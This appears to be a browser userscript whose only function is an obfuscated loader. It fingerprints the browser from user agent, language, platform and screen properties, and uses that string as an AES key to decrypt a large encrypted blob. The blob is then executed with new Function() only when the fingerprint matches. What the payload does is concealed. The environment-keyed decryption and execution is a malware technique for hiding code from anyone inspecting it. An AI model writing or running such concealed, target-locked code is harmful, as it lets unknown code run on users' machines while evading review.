
(function() {
    'use strict';

    function loadCryptoJS(callback) {
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js';
        script.onload = callback;
        document.head.appendChild(script);
    }

    function decrypt(text, key) {
        try {
            const bytes = CryptoJS.AES.decrypt(text, key);
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch (e) {
            console.error('Error decrypting:', e);
            return '';
        }
    }

    function gerarFingerprint() {
        const navigatorData = window.navigator;
        const fingerprint = [
            navigatorData.userAgent,
            navigatorData.language,
            navigatorData.platform,
            `${window.screen.width}x${window.screen.height}`,
            window.screen.colorDepth
        ].join('|');
        return fingerprint;
    }

    const encryptedCode = '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';
    const encryptedFingerprint = 'U2FsdGVkX1+2e9bRrXZ9eXltLVgplcud20setFAkTbMSUPxiImJsZ5nQvM1OCx66jKGFqqA261kVBniMHnC+EnO8paE9aLWWJLVTm5l//Os0JebW7PK+Fe38XoClqlcg4sPBp1vXQDqBhHK3ZrZ6Q74SURtV6BSsqY9KN7sxjNXSzJX/xm4UaJAC5BJK8qgJOUzYc46AsownbwCDl0hwDp6WqUOVQyXwc+5xI/VsCxfXavW9bjD+SNehyi0pEXhk';
    const key = gerarFingerprint();

    loadCryptoJS(function() {
        const decryptedFingerprint = decrypt(encryptedFingerprint, key);
        if (gerarFingerprint() === decryptedFingerprint) {
            const decryptedCode = decrypt(encryptedCode, key);
            try {
                // Execute the decrypted code directly in the current context
                (new Function(decryptedCode))();
            } catch (e) {
                console.error('Error evaluating code:', e);
            }
        } else {
            console.error('Fingerprint does not match.');
        }
    });
})();
        
